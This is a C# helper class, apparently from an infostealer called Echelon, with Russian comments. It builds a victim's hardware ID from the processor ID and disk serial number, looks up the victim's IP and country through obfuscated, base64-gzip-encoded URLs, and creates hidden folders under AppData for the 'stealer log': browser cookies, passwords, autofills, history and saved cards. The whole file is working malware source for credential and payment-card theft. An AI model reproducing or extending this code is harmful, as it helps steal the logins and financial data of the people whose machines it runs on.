
using System;
using System.Management;
using System.Net;
using System.Xml;

namespace Echelon
{
    public static class Help
    {
        // Пути
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Help.DesktopPath
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  Help.LocalData
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Help.AppDate
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Help.MyDocuments
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // Help.UserProfile
        public static readonly string userName = Environment.UserName;
        public static readonly string machineName = Environment.MachineName;
        // Выбираем рандомную системную папку
        // Мутекс берем из сгенерированного HWID

        // Генерим уникальный HWID
        public static string HWID = GetProcessorID() + GetHwid();
        public static string GeoIpURL = Decrypt.Get("H4sIAAAAAAAEAMsoKSmw0tfPLNBNLMjUS87P1a/IzQEAoQIM4RUAAAA=");
        // Создаем рандомные папки для сбора лога стиллера
        public static string dir = AppDate + "\\" + GenString.Generate() + HWID + GenString.GeneNumbersTo();
        public static string collectionDir = dir + "\\" + GenString.GeneNumbersTo() + HWID + GenString.Generate();
        public static string Browsers = collectionDir + "\\Browsers";
        public static string Cookies = Browsers + "\\Cookies";
        public static string Passwords = Browsers + "\\Passwords";
        public static string Autofills = Browsers + "\\Autofills";
        public static string Downloads = Browsers + "\\Downloads";
        public static string History = Browsers + "\\History";
        public static string Cards = Browsers + "\\Cards";

        // Временные переменные
        public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt"); //Help.date
        public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy"); //Help.dateLog

        public static string IP()
        {
            try
            {
                var ip = new WebClient().DownloadString(
                    Decrypt.Get("H4sIAAAAAAAEAMsoKSkottLXTyzI1MssyEyr1MsvStcHAPAN4yoWAAAA"));
                return ip;
            }
            catch
            {
                var none = "Connection error";
                return none;
            }
        }

        // Получаем код страны типа: [RU]
        public static string CountryCOde() //Help.CountryCOde()
        {
            try
            {
                var xml = new XmlDocument();
                xml.LoadXml(new WebClient().DownloadString(GeoIpURL)); //Получаем IP Geolocation CountryCOde
                var countryCode = "[" + xml.GetElementsByTagName("countryCode")[0].InnerText + "]";
                var CountryCOde = countryCode;
                return CountryCOde;
            }
            catch
            {
                var none = "ERR";
                return none;
            }
        }

        // Получаем название страны типа: [Russian]
        public static string Country() //Help.Country()

        {
            var xml = new XmlDocument();
            xml.LoadXml(new WebClient().DownloadString(GeoIpURL)); //Получаем IP Geolocation Country
            var countryCode = "[" + xml.GetElementsByTagName("country")[0].InnerText + "]";
            var Country = countryCode;
            return Country;
        }

        // Получаем VolumeSerialNumber
        public static string GetHwid() 
        {
            var hwid = "";
            try
            {
                var drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                var disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
                disk.Get();
                var diskLetter = disk["VolumeSerialNumber"].ToString();
                hwid = diskLetter;
            }
            catch
            { }
            return hwid;
        }

        // Получаем Processor Id
        public static string GetProcessorID()
        {
            var sProcessorID = "";
            var sQuery = "SELECT ProcessorId FROM Win32_Processor";
            var oManagementObjectSearcher = new ManagementObjectSearcher(sQuery);
            var oCollection = oManagementObjectSearcher.Get();
            foreach (var o in oCollection)
            {
                var oManagementObject = (ManagementObject) o;
                sProcessorID = (string)oManagementObject["ProcessorId"];
            }
            return sProcessorID;
        }
    }


}
